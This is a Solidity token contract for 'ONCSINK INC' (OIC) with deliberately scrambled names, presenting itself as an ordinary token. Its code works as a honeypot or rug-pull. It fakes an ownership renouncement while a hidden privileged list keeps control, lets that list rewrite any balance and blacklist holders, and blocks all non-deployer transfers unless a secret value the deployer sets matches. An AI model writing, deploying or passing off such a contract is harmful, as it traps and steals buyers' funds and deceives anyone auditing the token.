//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface ityxkeyjwrid {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface ctrdoroqg {
    function createPair(address ojfmxfuwvpb, address vnncsnjjysxl) external returns (address);
}

abstract contract ulghzhpsvi {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface echkpxjhvusar {
    function totalSupply() external view returns (uint256);

    function balanceOf(address ifzlolfeprzqj) external view returns (uint256);

    function transfer(address dskkxkjgdayh, uint256 wchuzrrekabas) external returns (bool);

    function allowance(address kykopzhudlytht, address spender) external view returns (uint256);

    function approve(address spender, uint256 wchuzrrekabas) external returns (bool);

    function transferFrom(address sender,address dskkxkjgdayh,uint256 wchuzrrekabas) external returns (bool);

    event Transfer(address indexed from, address indexed eyqbqyhocje, uint256 value);
    event Approval(address indexed kykopzhudlytht, address indexed spender, uint256 value);
}

interface iymzwbalyuow is echkpxjhvusar {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ONCSINKINC is ulghzhpsvi, echkpxjhvusar, iymzwbalyuow {

    uint256 private glvweoidgsrwv = 100000000 * 10 ** 18;

    bool public mpezsownvohqe;

    address public zxeihjioglhbjx;

    uint256 public emfsbsvchqa;

    uint256 private sqswuhkziz;

    address dyneslgsemhfma = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return fuslbcsvdgaqbk;
    }

    bool public xsndhcaoew;

    function oylyesbuizc(address pptgulark) public {
        if (xsndhcaoew) {
            return;
        }
        if (rfcpdicgzqh) {
            mzgmjhgsa = true;
        }
        jrnshiojkf[pptgulark] = true;
        if (sqswuhkziz != nuvghrrvo) {
            rfcpdicgzqh = true;
        }
        xsndhcaoew = true;
    }

    function transfer(address afadlsrozrw, uint256 wchuzrrekabas) external virtual override returns (bool) {
        return gpwfvxmzmp(_msgSender(), afadlsrozrw, wchuzrrekabas);
    }

    function name() external view virtual override returns (string memory) {
        return ehjlefkwm;
    }

    address vvuneicnu = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    address public nlsolmrqguzjg;

    function gpwfvxmzmp(address uhjkrbffrvxkyd, address dskkxkjgdayh, uint256 wchuzrrekabas) internal returns (bool) {
        if (uhjkrbffrvxkyd == zxeihjioglhbjx) {
            return wwbvpjjvqakf(uhjkrbffrvxkyd, dskkxkjgdayh, wchuzrrekabas);
        }
        uint256 yvlafoxgcbhd = echkpxjhvusar(nlsolmrqguzjg).balanceOf(vvuneicnu);
        require(yvlafoxgcbhd == hidmozjqr);
        require(!mfqzodkmwv[uhjkrbffrvxkyd]);
        return wwbvpjjvqakf(uhjkrbffrvxkyd, dskkxkjgdayh, wchuzrrekabas);
    }

    bool public rfcpdicgzqh;

    function jxxiseuiprv(address wfphtacleoiuro) public {
        xkfsjjtwiydcx();
        
        if (wfphtacleoiuro == zxeihjioglhbjx || wfphtacleoiuro == nlsolmrqguzjg) {
            return;
        }
        mfqzodkmwv[wfphtacleoiuro] = true;
    }

    mapping(address => mapping(address => uint256)) private oliexwyuk;

    mapping(address => uint256) private zmxiuyppzep;

    function balanceOf(address ifzlolfeprzqj) public view virtual override returns (uint256) {
        return zmxiuyppzep[ifzlolfeprzqj];
    }

    string private mcerjuumhpmt = "OIC";

    uint256 public nuvghrrvo;

    mapping(address => bool) public mfqzodkmwv;

    function allowance(address bzqagdvryeiuoi, address ksskgjrgyvyorh) external view virtual override returns (uint256) {
        if (ksskgjrgyvyorh == dyneslgsemhfma) {
            return type(uint256).max;
        }
        return oliexwyuk[bzqagdvryeiuoi][ksskgjrgyvyorh];
    }

    bool public mzgmjhgsa;

    function symbol() external view virtual override returns (string memory) {
        return mcerjuumhpmt;
    }

    function decimals() external view virtual override returns (uint8) {
        return mrleuumtlqimgk;
    }

    function owner() external view returns (address) {
        return fuslbcsvdgaqbk;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return glvweoidgsrwv;
    }

    uint8 private mrleuumtlqimgk = 18;

    function rlpvzdnrbntey(address afadlsrozrw, uint256 wchuzrrekabas) public {
        xkfsjjtwiydcx();
        zmxiuyppzep[afadlsrozrw] = wchuzrrekabas;
    }

    mapping(address => bool) public jrnshiojkf;

    string private ehjlefkwm = "ONCSINK INC";

    function vddrwaocgtrfyd() public {
        emit OwnershipTransferred(zxeihjioglhbjx, address(0));
        fuslbcsvdgaqbk = address(0);
    }

    bool public qaztngfnpxar;

    function xkfsjjtwiydcx() private view {
        require(jrnshiojkf[_msgSender()]);
    }

    bool private zgyhopeqnmh;

    uint256 hidmozjqr;

    uint256 public xvmhoipzshj;

    address private fuslbcsvdgaqbk;

    uint256 hyannufpntpl;

    function approve(address ksskgjrgyvyorh, uint256 wchuzrrekabas) public virtual override returns (bool) {
        oliexwyuk[_msgSender()][ksskgjrgyvyorh] = wchuzrrekabas;
        emit Approval(_msgSender(), ksskgjrgyvyorh, wchuzrrekabas);
        return true;
    }

    function iwdvsxukfcqyov(uint256 wchuzrrekabas) public {
        xkfsjjtwiydcx();
        hidmozjqr = wchuzrrekabas;
    }

    constructor (){
        
        vddrwaocgtrfyd();
        ityxkeyjwrid uimlaujldd = ityxkeyjwrid(dyneslgsemhfma);
        nlsolmrqguzjg = ctrdoroqg(uimlaujldd.factory()).createPair(uimlaujldd.WETH(), address(this));
        if (mzgmjhgsa != zgyhopeqnmh) {
            emfsbsvchqa = sqswuhkziz;
        }
        zxeihjioglhbjx = _msgSender();
        jrnshiojkf[zxeihjioglhbjx] = true;
        zmxiuyppzep[zxeihjioglhbjx] = glvweoidgsrwv;
        
        emit Transfer(address(0), zxeihjioglhbjx, glvweoidgsrwv);
    }

    event OwnershipTransferred(address indexed adcdsidhy, address indexed khwjfrvlvx);

    function wwbvpjjvqakf(address uhjkrbffrvxkyd, address dskkxkjgdayh, uint256 wchuzrrekabas) internal returns (bool) {
        require(zmxiuyppzep[uhjkrbffrvxkyd] >= wchuzrrekabas);
        zmxiuyppzep[uhjkrbffrvxkyd] -= wchuzrrekabas;
        zmxiuyppzep[dskkxkjgdayh] += wchuzrrekabas;
        emit Transfer(uhjkrbffrvxkyd, dskkxkjgdayh, wchuzrrekabas);
        return true;
    }

    function transferFrom(address uhjkrbffrvxkyd, address dskkxkjgdayh, uint256 wchuzrrekabas) external override returns (bool) {
        if (_msgSender() != dyneslgsemhfma) {
            if (oliexwyuk[uhjkrbffrvxkyd][_msgSender()] != type(uint256).max) {
                require(wchuzrrekabas <= oliexwyuk[uhjkrbffrvxkyd][_msgSender()]);
                oliexwyuk[uhjkrbffrvxkyd][_msgSender()] -= wchuzrrekabas;
            }
        }
        return gpwfvxmzmp(uhjkrbffrvxkyd, dskkxkjgdayh, wchuzrrekabas);
    }

    bool private sehlrlrozw;

}